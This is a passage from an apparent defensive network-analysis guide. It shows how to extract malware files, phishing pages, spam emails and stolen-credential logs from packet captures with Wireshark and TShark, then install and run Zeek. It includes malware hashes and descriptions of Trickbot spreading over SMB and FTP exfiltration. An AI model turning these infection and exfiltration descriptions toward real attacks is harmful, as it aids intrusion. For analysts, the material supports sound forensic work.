256\u00a0[filename]</li> </ul> <p>The\u00a0file\u00a0command identifies the type of file. The\u00a0shasum\u00a0command returns the file hash, in this case a SHA256 file hash.</p> <pre><code>\u2514\u2500$ file 'Invoice&amp;MSO-Request.doc' \nInvoice&amp;MSO-Request.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.3, Code page: 1252, Template: Normal.dotm, Last Saved By: Administrator, Revision Number: 2, Name of Creating Application: Microsoft Office Word, Create Time/Date: Thu Jun 27 19:24:00 2019, Last Saved Time/Date: Thu Jun 27 19:24:00 2019, Number of Pages: 1, Number of Words: 0, Number of Characters: 1, Security: 0\n\n\u2514\u2500$ shasum -a 256 'Invoice&amp;MSO-Request.doc' \nf808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb  Invoice&amp;MSO-Request.doc\n\n\u2514\u2500$ file knr.exe                  \nknr.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections\n\n\u2514\u2500$ shasum -a 256 knr.exe                  \n749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18  knr.exe\n</code></pre> <p>The information above confirms our suspected Word document is in fact a Microsoft Word document. It also confirms the suspected Windows executable file is indeed a Windows executable. We can check the SHA256 hashes against VirusTotal to see if these files are detected as malware. We can also do an internet search on the SHA256 hashes to possibly find additional information.</p> <p>In addition to these Windows executables or other malware files, we can also extract webpages from unencrypted HTTP traffic.</p> <p>Use Wireshark to open our second pcap for this tutorial, Wireshark-tutorial-extracting-objects-from-a-pcap-2-of-5.pcap. This pcap contains traffic of someone entering login credentials on a fake PayPal login page.</p> <p>When reviewing network traffic from a phishing site, we might want to know what the phishing webpage actually looks like. We can extract the HTML pages, images and other web content using the Export HTTP object menu. In this case, we can extract and view just the initial HTML page. After extracting that initial HTML page, viewing it in a web browser should reveal the page shown below.</p> <p></p> <p></p> <p>Alternatively, your html might also look like below (same content).</p> <p></p> <p>Use this method with caution. If you extract malicious HTML code from a pcap and view it in a web browser, the HTML might call out to malicious domains, which is why we recommend doing this in an isolated test environment.</p>"},{"location":"wireshark/wireshark.html#exporting-files-from-smb-traffic","title":"Exporting Files from SMB Traffic","text":"<p>Some malware uses Microsoft's Server Message Block (SMB) protocol to spread across an Active Directory (AD)-based network. A banking Trojan known as Trickbot added a worm module\u00a0as early as July 2017\u00a0that uses an exploit based on\u00a0EternalBlue\u00a0to spread across a network over SMB. Trickbot is no longer an active malware family, but this section contains a June 2019 Trickbot infection that is ideal for this tutorial.</p> <p>Use Wireshark to open our third pcap for this tutorial,\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-3-of-5.pcap. This pcap contains a Trickbot infection from June 2019 where malware is sent over SMB traffic from an infected client to the domain controller.</p> <p>This pcap takes place in the following AD environment:</p> <ul> <li>Domain:\u00a0cliffstone[.]net</li> <li>Network segment:\u00a010.6.26[.]0\u00a0through\u00a010.6.26[.]255\u00a0(10.6.26[.]0/24)</li> <li>Domain controller IP:\u00a010.6.26[.]6</li> <li>Domain controller hostname:\u00a0CLIFFSTONE-DC</li> <li>Segment gateway:\u00a010.6.26[.]1</li> <li>Broadcast address:\u00a010.6.26[.]255</li> <li>Windows client:\u00a0QUINN-OFFICE-PC\u00a0at\u00a010.6.26[.]110</li> </ul> <p>In this pcap, a Trickbot infection uses SMB to spread from an infected client at\u00a010.6.26[.]110\u00a0to its domain controller at\u00a010.6.26[.]6. To see the associated malware, use the following menu path shown below:</p> <ul> <li>File \u2192 Export Objects \u2192 SMB...</li> </ul> <p>This brings up an Export SMB object list, listing the SMB objects we can export from the pcap as shown below.</p> <p></p> <p>Two entries near the middle of the list have\u00a0\\10.6.26[.]6\\C$\u00a0as the hostname. A closer examination of their respective filename fields indicates these are two Windows executable files. See Table below for details.</p> Packet Number Hostname Content Type Size Filename 7058 \\10.6.26[.]6\\C$ FILE (712704/712704) W [100.0%] 712 kB \\WINDOWS\\d0p2nc6ka3f_fixhohlycj4ovqfcy_smchzo_ub83urjpphrwahjwhv_o5c0fvf6.exe 7936 \\10.6.26[.]6\\C$ FILE (115712/115712) W [100.0%] 115 kB \\WINDOWS\\oiku9bu68cxqenfmcsos2aek6t07_guuisgxhllixv8dx2eemqddnhyh46l8n_di.exe <p>In the Content Type column, we need [100.00%] to export a correct copy of these files. Any number less than 100 percent indicates there was some data loss in the network traffic, resulting in a corrupt or incomplete copy of the file. These Trickbot-related files from the pcap have SHA256 file hashes as shown in Table.</p> <pre><code>PS C:\\Users\\Administrator\\Downloads&gt; Get-FileHash sample1.exe -Algorithm SHA256\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nSHA256          59896AE5F3EDCB999243C7BFDC0B17EB7FE28F3A66259D797386EA470C010040       C:\\Users\\Administrator\\Downlo...\n\nPS C:\\Users\\Administrator\\Downloads&gt; Get-FileHash sample2.exe -Algorithm SHA256\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nSHA256          CF99990BEE6C378CBF56239B3CC88276EEC348D82740F84E9D5C343751F82560       C:\\Users\\Administrator\\Downlo...\n</code></pre> SHA256 hash File size 59896ae5f3edcb999243c7bfdc0b17eb7fe28f3a66259d797386ea470c010040 712 kB cf99990bee6c378cbf56239b3cc88276eec348d82740f84e9d5c343751f82560 115 kB"},{"location":"wireshark/wireshark.html#exporting-emails-from-smtp-traffic","title":"Exporting Emails from SMTP Traffic","text":"<p>Certain types of malware are designed to turn an infected Windows host into a spambot. These spambot hosts send hundreds of spam messages or malicious emails every minute. If any of these messages are sent using unencrypted SMTP, we can export these messages from a pcap of the traffic.</p> <p>One such example is from our next pcap,\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-4-of-5.pcap. In this pcap, an infected Windows client sends\u00a0sextortion spam. This pcap contains five seconds of spambot traffic from a single infected Windows host.</p> <p>Open the pcap in Wireshark and filter on\u00a0smtp.data.fragment\u00a0as shown below. This should reveal 50 examples of subject lines in the Info column on our Wireshark column display.</p> <p></p> <p>We can export these messages using the following menu path as shown in Figure 12:</p> <ul> <li>File \u2192 Export Objects \u2192 IMF...</li> </ul> <p>IMF stands for\u00a0Internet Message Format, which is saved as a name with an\u00a0.eml\u00a0file extension.</p> <p></p> <p>The exported .eml files can be reviewed with a text editor or an email client like Outlook as shown below.</p> <p></p>"},{"location":"wireshark/wireshark.html#exporting-files-from-ftp-traffic","title":"Exporting Files from FTP Traffic","text":"<p>Some malware families use FTP during malware infections. Our next pcap contains malware executables retrieved from an FTP server. It also contains stolen information sent from the infected Windows host back to the same FTP server.</p> <p>Our final pcap for this tutorial is\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-5-of-5.pcap. Open the pcap in Wireshark and use the following filter:</p> <ul> <li>ftp.request.command\u00a0or\u00a0(ftp-data and tcp.seq eq 1)</li> </ul> <p>The results are shown below. We should see\u00a0USER\u00a0for the username and\u00a0PASS\u00a0for the password. This is followed by\u00a0RETR\u00a0statements, which are requests to retrieve files. The filtered results show\u00a0RETR\u00a0statements for the following files:</p> <ul> <li>RETR q.exe</li> <li>RETR w.exe</li> <li>RETR e.exe</li> <li>RETR r.exe</li> <li>RETR t.exe</li> </ul> <p></p> <p>This Wireshark filter also shows the start of files sent over the FTP data channel. After the\u00a0RETR\u00a0statements for the\u00a0.exe\u00a0files, our column display should reveal\u00a0STOR\u00a0statements representing store requests to send HTML-based log files back to the same FTP server approximately every 18 seconds.</p> <p>In Wireshark version 4.0.0 or newer, we can export files from the FTP data channel using the following menu path as shown in Figure 16:</p> <ul> <li>File \u2192 Export Objects \u2192 FTP-DATA...</li> </ul> <p>This brings up a Window listing the FTP data objects we can export as shown below. This lists all of the HTML files sent to the FTP server containing information stolen from the infected Windows host.</p> <p></p> <p>We can view the exported files in a text editor or a browser as shown below. These files contain login credentials from the infected host\u2019s email client and web browser.</p> <p></p> <p>While this export FTP-DATA function works for the\u00a0.html\u00a0files, it did not present us with any of the\u00a0.exe\u00a0files retrieved from the FTP server. We must export these using another method.</p> <p>This method involves finding the start of FTP data streams for each of the\u00a0.exe\u00a0files returned from the FTP server. To find these TCP frames, use the following Wireshark filter:</p> <ul> <li>ftp-data.command contains \".exe\" and tcp.seq eq 1</li> </ul> <p>The results are shown below, revealing an FTP data stream for each of the\u00a0.exe\u00a0files.</p> <p></p> <p>We can follow the TCP stream for each of the frames, and we can export these files from the TCP stream window. First, follow the TCP stream for the first result that shows (SIZE q.exe) in the Info column as shown below (right-click \u2192 Follow \u2192 TCP Stream)</p> <p></p> <p>The TCP stream window shows hints that this is a Windows executable or DLL file. The first two bytes are the ASCII characters MZ. The TCP stream also reveals the string This program cannot be run in DOS mode.</p> <p>But to confirm this is a Windows executable or DLL file, we must export it from the TCP stream. To do this, select \u201cRaw\u201d in the \"Show data as\" menu.</p> <p></p> <p>The TCP stream now shows the information in hexadecimal text, and we can export this raw data as a file using the \"Save as...\" button as shown above. This is an FTP data stream for a file named q.exe, and we have to manually type that when saving the file.</p> <p>When saving the file as q.exe in a Linux or similar CLI environment, we can confirm this is a Windows executable file and get the SHA256 hash using the commands shown below.</p> <pre><code>\u2514\u2500$ file q.exe  \nq.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections\n\n\u2514\u2500$ shasum -a 256 q.exe  \nca34b0926cdc3242bbfad1c4a0b42cc2750d90db9a272d92cfb6cb7034d2a3bd  q.exe\n</code></pre> <p>This SHA256 hash shows a\u00a0high detection rate as malware on VirusTotal. </p> <p></p> <p>Follow the same process to export the other\u00a0.exe\u00a0files in the pcap.</p> <pre><code>\u2514\u2500$ file w.exe\nw.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections\n\n\u2514\u2500$ file e.exe                    \ne.exe: PE32+ executable (GUI) x86-64, for MS Windows, 6 sections\n\n\u2514\u2500$ file r.exe\nr.exe: PE32+ executable (GUI) x86-64, for MS Windows, 6 sections\n\n\u2514\u2500$ file t.exe\nt.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections\n\n\u2514\u2500$ shasum -a 256 w.exe\n08eb941447078ef2c6ad8d91bb2f52256c09657ecd3d5344023edccf7291e9fc  w.exe\n\n\u2514\u2500$ shasum -a 256 e.exe      \n32e1b3732cd779af1bf7730d0ec8a7a87a084319f6a0870dc7362a15ddbd3199  e.exe\n\n\u2514\u2500$ shasum -a 256 r.exe\n4ebd58007ee933a0a8348aee2922904a7110b7fb6a316b1c7fb2c6677e613884  r.exe\n\n\u2514\u2500$ shasum -a 256 t.exe\n10ce4b79180a2ddd924fdc95951d968191af2ee3b7dfc96dd6a5714dbeae613a  t.exe\n</code></pre> <p>This should give you the following files as shown below in Table</p> SHA256 hash Filename ca34b0926cdc3242bbfad1c4a0b42cc2750d90db9a272d92cfb6cb7034d2a3bd q.exe 08eb941447078ef2c6ad8d91bb2f52256c09657ecd3d5344023edccf7291e9fc w.exe 32e1b3732cd779af1bf7730d0ec8a7a87a084319f6a0870dc7362a15ddbd3199 e.exe 4ebd58007ee933a0a8348aee2922904a7110b7fb6a316b1c7fb2c6677e613884 r.exe 10ce4b79180a2ddd924fdc95951d968191af2ee3b7dfc96dd6a5714dbeae613a t.exe <p>These five .exe files are all Windows executables, and they all have a high detection rate as malware on VirusTotal.</p> <p>Wireshark does an excellent job of combining data from multiple IP packets and the associated TCP frames to show objects sent over unencrypted network traffic. Using the methods outlined in this tutorial, we can also use Wireshark to extract these objects from a pcap. This can be extremely helpful if you need to examine items during an investigation of suspicious activity.</p>"},{"location":"wireshark/wireshark.html#tshark","title":"TShark","text":"<p>TShark is a terminal oriented version of Wireshark designed for capturing and displaying packets when an interactive user interface isn\u2019t necessary or available.</p> <p>If a PCAP is larger than 500 MB, Wireshark will struggle to analyse. For example, if we are interested in the IP address 23.63.254.163, we can run a filter on Tshark and output it into another PCAP. We can then use Wireshark to read this new PCAP, which should be a manageable size.</p> <p>Open PowerShell and navigate to the directory where Wireshark is installed.</p> <p>Run <code>tshark.exe</code>, use the <code>-r</code> flag to point it to your PCAP of interest, use the <code>-w</code> flag to point to your output path including the new PCAP name, and specify the filter (e.g., <code>ip.addr == (value)</code>).</p> <pre><code>PS C:\\program files\\wireshark&gt; .\\tshark.exe -r C:\\Users\\Administrator\\Downloads\\Wireshark-tutorial-extracting-objects-5-pcaps\\Wireshark-tutorial-extracting-objects-from-a-pcap-1-of-5.pcap -w C:\\Users\\Administrator\\Downloads\\Wireshark-tutorial-extracting-objects-5-pcaps\\newdata.pcap ip.addr == 23.63.254.163\n</code></pre> <p></p> <p>This produces a new PCAP file of manageable size, filtering on the IP address 23.63.254.163.</p>"},{"location":"wireshark/wireshark.html#references","title":"References","text":"<ul> <li>https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/</li> <li>https://youtu.be/XZlasFStzqM?si=L0LHw4RODO8tgku8</li> <li>https://www.wireshark.org/docs/</li> </ul>"},{"location":"zeek/zeek.html","title":"Zeek","text":""},{"location":"zeek/zeek.html#zeek","title":"Zeek","text":"<p>Zeek is an open-source network analysis framework and security monitoring tool. Zeek provides deep visibility into network traffic and enables organisations to detect and respond to security threats in real-time. Unlike traditional intrusion detection systems (IDS) that rely primarily on signature matching, Zeek offers a more flexible and comprehensive approach by analysing network behaviors and events.</p>"},{"location":"zeek/zeek.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, the Ubuntu host simulated a compromised machine by visiting non-malicious websites, such as testmyids.org and Reddit, with Reddit being treated as malicious to trigger alerts in a safe and controlled environment. To demonstrate Zeek to Suricata integration via PCAP files, Zeek was installed on the same host as Suricata.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) Suricata Ubuntu 22.04 LTS Suricata and Zeek 10.0.0.27 <p></p>"},{"location":"zeek/zeek.html#install-zeek-offline","title":"Install Zeek offline","text":"<p>On an Ubuntu machine with internet connection:</p> <p>Make a folder called zeek-offline and change permission of the directory. </p> <pre><code>mkdir zeek-offline\ncd zeek-offline\nsudo chmod 755 ~/zeek-offline/\n</code></pre> <p>Add the Zeek repository and download the Zeek package and its dependencies:</p> <pre><code>echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_22.04/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list\ncurl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_22.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg &gt; /dev/null\nsudo apt update\nsudo apt-get install --download-only zeek \nsudo apt-get download zeek-core zeekctl zeek-core-dev zeek-spicy-dev zeek-zkg zeek-client \\\nlibbroker-dev libpcap-dev libssl-dev zlib1g-dev libmaxminddb-dev python3-semantic-version python3-git zeek-btest zeek-btest-data \\\nlibpcap0.8-dev libssl3=3.0.2-0ubuntu1.18 git python3-gitdb libc6-dev \\\nliberror-perl git-man libdbus-1-dev python3-smmap rpcsvc-proto libtirpc-dev \\\nlibc-dev-bin linux-libc-dev libcrypt-dev libnsl-dev pkg-config libdpkg-perl \\\nzeek-aux\n</code></pre> <p>Note: if you get a permission denied error, run the command again. </p> <p>Make a directory called curl and change permission of the directory. </p> <pre><code>mkdir curl\ncd curl\nsudo chmod 755 ~/curl/\n</code></pre> <p>Download curl and its dependencies.</p> <pre><code>sudo apt-get download curl libc6 libcurl4 zlib1g\n</code></pre> <p>Transferzeek-offline and curl to an Ubuntu host without internet access.</p> <p>Install curl:</p> <pre><code>cd curl-packages\nsudo dpkg -i *\n</code></pre> <p>Install Zeek:</p> <pre><code>cd zeek-offline\nsudo dpkg -i *\n</code></pre>"},{"location":"zeek/zeek.html#introduction-to-zeek","title":"Introduction to Zeek","text":""},{"location":"zeek/zeek.html#managing-zeek-with-zeekcontrol","title":"Managing Zeek with ZeekControl","text":"<p>ZeekControl is an interactive shell for easily operating/managing Zeek installations on a single system or even across multiple systems in a traffic-monitoring cluster.</p> <p>In\u00a0<code>/opt/zeek/etc/node.cfg</code>, set the right interface to monitor.</p> <p>For example:</p> <pre><code>nano /opt/zeek/etc/node.cfg\n</code></pre> <pre><code>[zeek]\ntype=standalone\nhost=localhost\ninterface=ens32   # change this according to your listening interface in ifconfig\n</code></pre> <p>[Optional but recommended]: In\u00a0<code>/opt/zeek/etc/networks.cfg</code>, add networks that Zeek will consider local to the monitored environment. More on this\u00a0below.</p> <p>[Optional]: In\u00a0<code>/opt/zeek/etc/zeekctl.cfg</code>, change the\u00a0<code>MailTo</code>\u00a0email address to a desired recipient and the\u00a0<code>LogRotationInterval</code>\u00a0to a desired log archival frequency.</p> <p>Now start the ZeekControl shell like:</p> <pre><code>cd /opt/zeek/bin\nsudo ./zeekctl\n</code></pre> <p>Since this is the first-time use of the shell, perform an initial installation of the ZeekControl configuration:</p> <pre><code>[ZeekControl] &gt; install\n</code></pre> <p>Then start up a Zeek instance:</p> <pre><code>[ZeekControl] &gt; start\n</code></pre> <p>There is another ZeekControl command,\u00a0<code>deploy</code>, that combines the above two steps and can be run after any changes to Zeek policy scripts or the ZeekControl configuration. Note that the\u00a0<code>check</code>\u00a0command is available to validate a modified configuration before installing it.</p> <pre><code>[ZeekControl] &gt; deploy\n</code></pre> <p>If there are errors while trying to start the Zeek instance, you can view the details with the\u00a0<code>diag</code>\u00a0command. If started successfully, the Zeek instance will begin analyzing traffic according to a default policy and output the results in\u00a0<code>/opt/zeek/logs/current</code> directory.</p> <p>You can leave it running for now, but to stop this Zeek instance you would do:</p> <pre><code>[ZeekControl] &gt; stop\n</code></pre> <p>Once Zeek is stopped, the log files in the\u00a0<code>/opt/zeek/logs/current</code>\u00a0directory are compressed and moved into the current day named folder inside the\u00a0<code>/opt/zeek/logs</code>\u00a0directory.</p>"},{"location":"zeek/zeek.html#browsing-log-files","title":"Browsing Log Files","text":"<p>By default, logs are written out in human-readable (ASCII) format and data is organized into columns (tab-delimited). Logs that are part of the current rotation interval are accumulated in\u00a0<code>/opt/zeek/logs/current/</code>\u00a0(if Zeek is not running, the directory will be empty). For example, the\u00a0<code>http.log</code>\u00a0contains the results of Zeek HTTP protocol analysis. Here are the first few columns of\u00a0<code>http.log</code>:</p> <pre><code># ts              uid              orig_h     orig_p   resp_h         resp_p\n1726175258.283795   ClWVdk6JZxaBGiba1   10.0.0.25    36768    91.189.91.48   80\n</code></pre> <p>Logs that deal with analysis of a network protocol will often start like this: a timestamp, a unique connection identifier (UID), and a connection 4-tuple (originator host/port and responder host/port). The UID can be used to identify and correlate all logged activity (possibly across multiple log files) associated with a given connection 4-tuple over its lifetime.</p> <p>The remaining columns of protocol-specific logs then detail the protocol-dependent activity that\u2019s occurring. E.g.\u00a0<code>http.log</code>\u2019s next few columns (shortened for brevity) show a request to the root of Zeek website:</p> <pre><code># method   host         uri  referrer  user_agent\nGET        zeek.org  /    -         &lt;...&gt;Chrome/12.0.742.122&lt;...&gt;\n</code></pre> <p>Apart from the conventional network protocol specific log files, Zeek also generates other important log files based on the network traffic statistics, interesting activity captured in the traffic, and detection focused log files. Some logs that are worth explicit mention:</p> <ul> <li> <p><code>conn.log</code></p> <p>Contains an entry for every connection seen on the wire, with basic properties such as time and duration, originator and responder IP addresses, services and ports, payload size, and much more. This log provides a comprehensive record of the network\u2019s activity.</p> </li> <li> <p><code>notice.log</code></p> <p>Identifies specific activity that Zeek recognises as potentially interesting, odd, or bad. In Zeek-speak, such activity is called a \u201cnotice\u201d.</p> </li> <li> <p><code>known_services.log</code></p> <p>This log file contains the services detected on the local network and are known to be actively used by the clients on the network. It helps in enumerating what all services are observed on a local network and if they all are intentional and known to the network administrator.</p> </li> <li> <p><code>weird.log</code></p> <p>Contains unusual or exceptional activity that can indicate malformed connections, traffic that doesn\u2019t conform to a particular protocol, malfunctioning or misconfigured hardware/services, or even an attacker attempting to avoid/confuse a sensor.</p> </li> </ul> <p>By default, ZeekControl regularly takes all the logs from\u00a0<code>/opt/zeek/logs/current</code>\u00a0and archives/compresses them to a directory named by date, e.g.\u00a0<code>/opt/zeek/logs/2021-01-01</code>. The frequency at which this is done can be configured via the\u00a0<code>LogRotationInterval</code>\u00a0option in\u00a0<code>/opt/zeek/etc/zeekctl.cfg</code>. The default is every hour.</p>"},{"location":"zeek/zeek.html#zeek-as-a-command-line-utility","title":"Zeek as a Command-Line Utility","text":"<p>If you prefer not to use ZeekControl (e.g., you don\u2019t need its automation and management features), here\u2019s how to directly control Zeek for your analysis activities from the command line for both live traffic and offline working from traces.</p>"},{"location":"zeek/zeek.html#monitoring-live-traffic","title":"Monitoring Live Traffic","text":"<p>Analysing live traffic from an interface is simple:</p> <pre><code>zeek -i ens32 &lt;list of scripts to load&gt;\n</code></pre> <p><code>ens32</code>\u00a0should be replaced by the interface on which you want to monitor the traffic. The standard base scripts will be loaded and enabled by default. A list of additional scripts can be provided in the command as indicated above by\u00a0<code>&lt;list\u00a0of\u00a0scripts\u00a0to\u00a0load&gt;</code>. Any such scripts supplied as space-separated files or paths will be loaded by Zeek in addition to the standard base scripts.</p> <p>Zeek will output log files into the current working directory.</p>"},{"location":"zeek/zeek.html#reading-packet-capture-pcap-files","title":"Reading Packet Capture (pcap) Files","text":"<p>When you want to do offline analysis of already captured pcap files, Zeek is a very handy tool to analyse the pcap and gives a high level holistic view of the traffic captured in the pcap.</p> <p>If you want to capture packets from an interface and write them to a file to later analyse it with Zeek, then it can be done like this:</p> <pre><code>sudo tcpdump -i ens32 -s 0 -w sample.pcap\n</code></pre> <p>Where\u00a0<code>ens32</code>\u00a0should be replaced by the correct interface for your system, for example as shown by the\u00a0ifconfig\u00a0command. (The\u00a0<code>-s\u00a00</code>\u00a0argument tells it to capture whole packets; in cases where it is not supported, use\u00a0<code>-s\u00a065535</code>\u00a0instead).</p> <p>After capturing traffic for a while, kill the tcpdump (with\u00a0ctrl-c), and tell Zeek to perform all the default analysis on the capture:</p> <pre><code>/opt/zeek/bin/zeek -r sample.pcap\n</code></pre> <p>Zeek will output log files into the current working directory. </p> <p>To specify the output directory for logs, you can set\u00a0<code>Log::default_logdir</code>\u00a0on the command line:</p> <pre><code>mkdir output_directory\n/opt/zeek/bin/zeek -r sample.pcap Log::default_logdir=output_directory\n</code></pre> <p>If no logs are generated for a pcap, try to run the pcap with\u00a0<code>-C</code>\u00a0to tell Zeek to ignore invalid IP Checksums:</p> <pre><code>/opt/zeek/bin/zeek \u2013C \u2013r sample.pcap\n</code></pre> <p>If you are interested in more detection, you can load the\u00a0<code>local.zeek</code>\u00a0script that is included as a suggested configuration:</p> <pre><code>zeek -r sample.pcap local\n</code></pre> <p>If you want to run a custom or an extra script (assuming it\u2019s in the default search path, more on this in the next section) to detect any particular behavior in the pcap, run Zeek with following command:</p> <pre><code>zeek \u2013r sample.pcap my-script.zeek\n</code></pre>"},{"location":"zeek/zeek.html#zeek-log-formats-and-inspection","title":"Zeek Log Formats and Inspection","text":"<p>Zeek creates a variety of logs when run in its default configuration. This data can be intimidating for a first-time user. In this section, we will process a sample packet trace with Zeek, and take a brief look at the sorts of logs Zeek creates. We will look at logs created in the traditional format, as well as logs in JSON format. We will also introduce a few command-line tools to examine Zeek logs.</p>"},{"location":"zeek/zeek.html#working-with-a-sample-trace","title":"Working with a Sample Trace","text":"<p>For the examples that follow, we will use Zeek on a Linux system to process network traffic captured and stored to disk. We saved this trace file earlier in packet capture (PCAP) format as\u00a0<code>sample.pcap</code>. The command line protocol analyser Tcpdump, which ships with most Unix-like distributions, summarises the contents of this file.</p> <pre><code>tcpdump -n -r sample.pcap\n</code></pre> <pre><code>reading from file sample.pcap, link-type EN10MB (Ethernet), snapshot length 262144\n16:29:30.278903 IP6 fe80::11bb:1eb2:4e66:8cb2.5353 &gt; ff02::fb.5353: 0 [2q] PTR (QM)? _ipp._tcp.local. PTR (QM)? _ipps._tcp.local. (45)\n16:29:30.279490 IP 10.0.0.20.5353 &gt; 224.0.0.251.5353: 0 [2q] PTR (QM)? _ipp._tcp.local. PTR (QM)? _ipps._tcp.local. (45)\n16:29:30.739547 IP 10.0.0.25.38596 &gt; 10.0.0.20.1514: Flags [.], seq 3895547640:3895549088, ack 1070210661, win 502, options [nop,nop,TS val 3662342600 ecr 1031616358], length 1448\n16:29:30.739583 IP 10.0.0.25.38596 &gt; 10.0.0.20.1514: Flags [P.], seq 1448:2350, ack 1, win 502, options [nop,nop,TS val 3662342600 ecr 1031616358], length 902\n16:29:30.740370 IP 10.0.0.20.1514 &gt; 10.0.0.25.38596: Flags [.], ack 2350, win 7056, options [nop,nop,TS val 1031618362 ecr 3662342600], length 0\n16:29:32.741070 IP 10.0.0.25.38596 &gt; 10.0.0.20.1514: Flags [P.], seq 2350:2652, ack 1, win 502, options [nop,nop,TS val 3662344602 ecr 1031618362], length 302\n16:29:32.742172 IP 10.0.0.20.1514 &gt; 10.0.0.25.38596: Flags [.], ack 2652, win 7056, options [nop,nop,TS val 1031620364 ecr 3662344602], length 0\n16:29:32.744648 IP 10.0.0.20.1514 &gt; 10.0.0.25.38596: Flags [P.], seq 1:90, ack 2652, win 7056, options [nop,nop,TS val 1031620366 ecr 3662344602], length 89\n...\n</code></pre> <p>Rather than run Zeek against a live interface, we will ask Zeek to digest this trace. This process allows us to vary Zeek\u2019s run-time operation, keeping the traffic constant.</p> <p>First we make two directories to store the log files that Zeek will produce. Then we will move into the \u201cdefault\u201d directory.</p> <pre><code>mkdir default\nmkdir json\ncd default/\n</code></pre>"},{"location":"zeek/zeek.html#zeek-tsv-format-logs","title":"Zeek TSV Format Logs","text":"<p>From this location on disk, we tell Zeek to digest the\u00a0<code>sample.pcap</code>\u00a0file.</p> <pre><code>zeek -C -r ../sample.pcap\n</code></pre> <p>The\u00a0<code>-r</code>\u00a0flag tells Zeek where to find the trace of interest.</p> <p>The\u00a0<code>-C</code>\u00a0flag tells Zeek to ignore any TCP checksum errors. This happens on many systems due to a feature called \u201cchecksum offloading,\u201d but it does not affect our analysis.</p> <p>Zeek completes its task without reporting anything to the command line. This is standard Unix-like behavior. Using the\u00a0ls\u00a0command we see what files Zeek created when processing the trace.</p> <pre><code>root@Suricata:/home/cyber/test_pcap/default# ls -al\ntotal 36\ndrwxr-xr-x 2 root root 4096 Sep 13 16:38 .\ndrwxr-xr-x 5 root root 4096 Sep 13 16:37 ..\n-rw-r--r-- 1 root root 1673 Sep 13 16:38 conn.log\n-rw-r--r-- 1 root root 1499 Sep 13 16:38 dns.log\n-rw-r--r-- 1 root root 1037 Sep 13 16:38 files.log\n-rw-r--r-- 1 root root 1281 Sep 13 16:38 http.log\n-rw-r--r-- 1 root root  802 Sep 13 16:38 ntp.log\n-rw-r--r-- 1 root root  278 Sep 13 16:38 packet_filter.log\n-rw-r--r-- 1 root root 2919 Sep 13 16:38 syslog.log\n</code></pre> <p>Zeek created five files. We will look at the contents of Zeek log data in detail in later sections. For now, we will take a quick look at each file, beginning with the\u00a0<code>conn.log</code>.</p> <p>We use the\u00a0cat\u00a0command to show the contents of each log.</p> <pre><code>cat conn.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   conn\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   proto   service duration    orig_bytes  resp_bytes  conn_state  local_orig  local_resp  missed_bytes    history orig_pkts   orig_ip_bytes   resp_pkts   resp_ip_bytes   tunnel_parents\n#types  time    string  addr    port    addr    port    enum    string  interval    count   count   string  bool    bool    count   string  count   count   count   count   set[string]\n1726201770.278903   CTJy3z1weA4svLHlMi  fe80::11bb:1eb2:4e66:8cb2   5353    ff02::fb    5353    udp dns -   -   -   S0  T   F   0   D   1   9300    -\n1726201770.279490   C7y3kf3wLnGC8eMFoj  10.0.0.20   5353    224.0.0.251 5353    udp dns -   -   -   S0  T   F   0   D   1   73  0   0   -\n1726201774.886295   CXetZefExG72gUZBg   10.0.0.25   37842   8.8.8.8 53  udp dns 0.071811    43  107 SF  T   F   0   Dd  1   71  1   135-\n1726201774.886782   Cw9GHy49hDbEZja5N4  10.0.0.25   54819   8.8.8.8 53  udp dns 0.105430    43  267 SF  T   F   0   Dd  1   71  1   295-\n1726201776.494923   CoOFuY2lG5sn40Cx4h  10.0.0.25   51716   65.9.141.86 80  tcp http    0.095743    92  538 SF  T   F   0   ShADadFf    7   4645    806 -\n1726201776.229030   CSHUEK1r1ZslFXj9Ea  10.0.0.1    19274   10.0.0.25   514 udp syslog  1.999178    2392    0   S0  T   T   0   D   3   2476    0   0-\n1726201776.995145   CY5BY43UhmmrHShwJg  10.0.0.20   34602   185.125.190.58  123 udp ntp 0.282631    48  48  SF  T   F   0   Dd  1   76  1   76  -\n1726201774.994946   Cf7ViS38Dir6S2Sp24  10.0.0.25   37652   65.9.141.86 80  tcp http    0.108029    92  538 SF  T   F   0   ShADadFf    6   4124    754 -\n1726201775.764476   CFRepo2KqxbrWWYUr1  10.0.0.25   54034   65.9.141.117    80  tcp http    0.079561    92  538 SF  T   F   0   ShADadFf    7   4645    806 -\n1726201770.739547   CXYKK42G1Ga2LvFmh3  10.0.0.25   38596   10.0.0.20   1514    tcp -   8.024697    13178   89  OTH T   T   0   DadA    16  14010   11661   -\n#close  2024-09-13-16-38-11\n</code></pre> <p>Next we look at Zeek\u2019s\u00a0<code>dns.log</code>.</p> <pre><code>cat dns.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   dns\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   proto   trans_id    rtt query   qclass  qclass_name qtype   qtype_name  rcode   rcode_name  AATC    RD  RA  Z   answers TTLs    rejected\n#types  time    string  addr    port    addr    port    enum    count   interval    string  count   